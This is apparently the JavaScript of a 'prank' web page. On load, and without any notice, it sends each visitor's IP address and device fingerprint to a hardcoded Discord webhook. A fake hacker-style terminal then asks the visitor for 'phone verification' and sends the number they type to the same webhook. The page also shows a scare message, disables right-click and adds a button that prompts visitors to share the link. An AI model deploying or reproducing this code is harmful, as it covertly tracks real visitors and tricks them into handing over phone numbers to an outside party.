console.log('Script loaded successfully!');

// Terminal-style prank script
// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';

// Global variable to store phone number
let userPhoneNumber = '';

// Function to validate phone number
function validatePhoneNumber(phoneNumber) {
    // Remove all non-digit characters
    const cleaned = phoneNumber.replace(/\D/g, '');
    
    // Basic validation for different formats
    // US format: 10 digits (optional country code +1)
    // International: 8-15 digits
    if (cleaned.length >= 8 && cleaned.length <= 15) {
        return {
            valid: true,
            cleaned: cleaned,
            formatted: formatPhoneNumber(cleaned)
        };
    }
    
    return {
        valid: false,
        cleaned: cleaned,
        formatted: phoneNumber
    };
}

// Function to format phone number
function formatPhoneNumber(phoneNumber) {
    const cleaned = phoneNumber.replace(/\D/g, '');
    
    // US format
    if (cleaned.length === 10) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
    }
    
    // International format
    if (cleaned.length > 10) {
        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
    }
    
    return cleaned;
}

// Function to detect mobile device type
function getMobileDeviceType() {
    const userAgent = navigator.userAgent;
    
    if (/iPhone|iPad|iPod/i.test(userAgent)) {
        return 'iOS';
    } else if (/Android/i.test(userAgent)) {
        return 'Android';
    } else if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Other Mobile';
    }
    
    return 'Desktop';
}

// Function to get detailed device information
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const colorDepth = `${window.screen.colorDepth} bit`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timestamp = new Date().toISOString();
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
    const cpuCores = navigator.hardwareConcurrency || 'Unknown';
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
    const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
    const mobileDeviceType = getMobileDeviceType();
    
    return {
        userAgent,
        platform,
        language,
        screenRes,
        colorDepth,
        timezone,
        timestamp,
        deviceMemory,
        cpuCores,
        isMobile,
        browser,
        os,
        mobileDeviceType,
        phoneNumber: userPhoneNumber
    };
}

// Function to send webhook with device info
async function sendWebhook() {
    console.log('Sending webhook...');
    if (WEBHOOK_URL) {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => 'Unknown IP');
            
        // Get detailed device information
        const deviceInfo = getDeviceInfo();
        
        // Create embed with device information
        const embed = {
            title: '🌐 Website Visitor',
            description: '📱 New visitor details',
            color: 0x00ff00,
            fields: [
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '🕒 Timestamp', value: deviceInfo.timestamp, inline: true },
                { name: '🌍 Timezone', value: deviceInfo.timezone, inline: true },
                { name: '💻 Platform', value: deviceInfo.platform, inline: true },
                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                { name: '🔍 Screen', value: `${deviceInfo.screenRes} (${deviceInfo.colorDepth})`, inline: true },
                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                { name: '🖥️ OS', value: deviceInfo.os, inline: true },
                { name: '🌐 Language', value: deviceInfo.language, inline: true },
                { name: '💾 RAM', value: deviceInfo.deviceMemory, inline: true },
                { name: '💻 CPU Cores', value: deviceInfo.cpuCores, inline: true },
                { name: '📞 Phone Number', value: deviceInfo.phoneNumber || 'Not provided', inline: true },
                { name: '🛠️ User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
            ]
        };
        
        // Prepare webhook data
        const webhookData = {
            embeds: [embed],
            content: '🚀 Someone Has Opened The Website!'
        };

        // Send webhook with device info
        return fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [embed],
                content: '🚀 New website visitor!'
            })
        });
    }
}

// Main function to run the prank
async function runPrank() {
    try {
        console.log('Collecting device information...');
        await sendWebhook();
        console.log('Webhook sent successfully!');
    } catch (error) {
        console.error('Error in prank:', error);
    }
}

// Start the prank when page loads
console.log('Starting prank...');
runPrank().catch(error => {
    console.error('Error in prank execution:', error);
});

document.addEventListener('DOMContentLoaded', () => {
    // Get DOM elements
    const terminal = document.getElementById('terminal');
    const ipLine = document.getElementById('ip-line');
    const cookiesLine = document.getElementById('cookies-line');
    const accountLine = document.getElementById('account-line');
    const phoneLine = document.getElementById('phone-line');
    const jokeLine = document.getElementById('joke-line');
    const revealLine = document.getElementById('reveal-line');
    const phoneInputContainer = document.getElementById('phone-input-container');
    const phoneInput = document.getElementById('phone-input');
    const phoneSubmit = document.getElementById('phone-submit');
    
    // Typewriter effect
    function typeWriter(element, text, speed = 10, callback) {
        let i = 0;
        element.innerHTML = '';
        
        function type() {
            if (i < text.length) {
                element.innerHTML += text.charAt(i);
                i++;
                setTimeout(type, speed);
            } else if (callback) callback();
        }
        type();
    }
    
    // Get a random IP address
    function getRandomIp() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    // Fixed location
    const location = 'England, UK';
    
    // Start the sequence
    setTimeout(() => {
        // Show IP address with fixed location
        typeWriter(ipLine, `> IP Address: ${getRandomIp()} (${location})`, 10, () => {
            // Show data collection message
            setTimeout(() => {
                typeWriter(cookiesLine, '> Scanning device for personal data...', 10, () => {
                    // Show fake data found
                    setTimeout(() => {
                        typeWriter(accountLine, '> Data collection complete!', 10, () => {
                            // Show phone collection message with mobile-specific text
                            setTimeout(() => {
                                const mobileType = getMobileDeviceType();
                                let phoneMessage = '> Phone verification required...';
                                
                                if (mobileType === 'iOS') {
                                    phoneMessage = '> iOS device detected - Phone verification required...';
                                } else if (mobileType === 'Android') {
                                    phoneMessage = '> Android device detected - Phone verification required...';
                                }
                                
                                typeWriter(phoneLine, phoneMessage, 10, () => {
                                    // Show phone input form
                                    setTimeout(() => {
                                        phoneInputContainer.style.display = 'block';
                                        phoneInput.focus();
                                        
                                        // Add mobile-specific features
                                        addMobileFeatures(mobileType);
                                        
                                        // Handle phone submission
                                        phoneSubmit.addEventListener('click', handlePhoneSubmit);
                                        phoneInput.addEventListener('keypress', (e) => {
                                            if (e.key === 'Enter') {
                                                handlePhoneSubmit();
                                            }
                                        });
                                    }, 1000);
                                });
                            }, 1000);
                        });
                    }, 1000);
                });
            }, 1000);
        });
    }, 500);
    
    // Function to add mobile-specific features
    function addMobileFeatures(mobileType) {
        if (mobileType === 'iOS' || mobileType === 'Android') {
            // Add mobile-specific input attributes
            phoneInput.setAttribute('inputmode', 'tel');
            phoneInput.setAttribute('autocomplete', 'tel');
            phoneInput.setAttribute('pattern', '[0-9]{8,15}');
            
            // Add mobile-specific placeholder text
            if (mobileType === 'iOS') {
                phoneInput.placeholder = 'Enter iPhone number';
            } else if (mobileType === 'Android') {
                phoneInput.placeholder = 'Enter Android number';
            }
        }
    }
    
    // Function to create mobile communication links
    function createMobileLinks(phoneNumber) {
        const cleaned = phoneNumber.replace(/\D/g, '');
        const mobileType = getMobileDeviceType();
        
        if (mobileType === 'iOS' || mobileType === 'Android') {
            const linksContainer = document.createElement('div');
            linksContainer.className = 'mobile-links';
            linksContainer.style.marginTop = '15px';
            
            // Create call link
            const callLink = document.createElement('a');
            callLink.href = `tel:${cleaned}`;
            callLink.className = 'mobile-link';
            callLink.textContent = '📞 Call Number';
            callLink.style.marginRight = '10px';
            callLink.style.color = '#0f0';
            callLink.style.textDecoration = 'none';
            
            // Create SMS link
            const smsLink = document.createElement('a');
            smsLink.href = `sms:${cleaned}`;
            smsLink.className = 'mobile-link';
            smsLink.textContent = '💬 Send SMS';
            smsLink.style.color = '#0f0';
            smsLink.style.textDecoration = 'none';
            
            linksContainer.appendChild(callLink);
            linksContainer.appendChild(smsLink);
            
            return linksContainer;
        }
        
        return null;
    }
    
    // Function to handle phone number submission
    function handlePhoneSubmit() {
        const phoneNumber = phoneInput.value.trim();
        const validation = validatePhoneNumber(phoneNumber);
        
        if (validation.valid) {
            userPhoneNumber = validation.formatted;
            phoneInputContainer.style.display = 'none';
            
            // Show success message
            const successLine = document.createElement('div');
            successLine.className = 'line success';
            terminal.appendChild(successLine);
            
            const mobileType = getMobileDeviceType();
            let successMessage = `> Phone number verified: ${validation.formatted}`;
            
            if (mobileType === 'iOS') {
                successMessage += ' (iOS)';
            } else if (mobileType === 'Android') {
                successMessage += ' (Android)';
            }
            
            typeWriter(successLine, successMessage, 10, () => {
                // Send updated webhook with phone number
                sendWebhook().then(() => {
                    // Add mobile-specific links if on mobile device
                    setTimeout(() => {
                        const mobileLinks = createMobileLinks(validation.cleaned);
                        if (mobileLinks) {
                            terminal.appendChild(mobileLinks);
                        }
                        
                        // Continue with joke message
                        setTimeout(() => {
                            typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
                                // Final reveal
                                setTimeout(() => {
                                    typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
                                        // Add a share button
                                        const button = document.createElement('button');
                                        button.className = 'button';
                                        button.textContent = 'Made By @Phonzr';
                                        button.onclick = () => {
                                            if (navigator.share) {
                                                navigator.share({
                                                    title: 'Check this out!',
                                                    text: 'I found something interesting!',
                                                    url: window.location.href
                                                });
                                            } else {
                                                alert('Share this link: ' + window.location.href);
                                            }
                                        };
                                        terminal.appendChild(button);
                                    });
                                }, 1000);
                            });
                        }, 1000);
                    }, 1000);
                });
            });
        } else {
            // Show error message
            phoneInput.style.borderColor = '#ff4444';
            phoneInput.style.backgroundColor = 'rgba(255, 68, 68, 0.1)';
            setTimeout(() => {
                phoneInput.style.borderColor = '';
                phoneInput.style.backgroundColor = '';
            }, 2000);
        }
    }
    
    // Prevent context menu on right-click
    document.addEventListener('contextmenu', (e) => e.preventDefault());
});
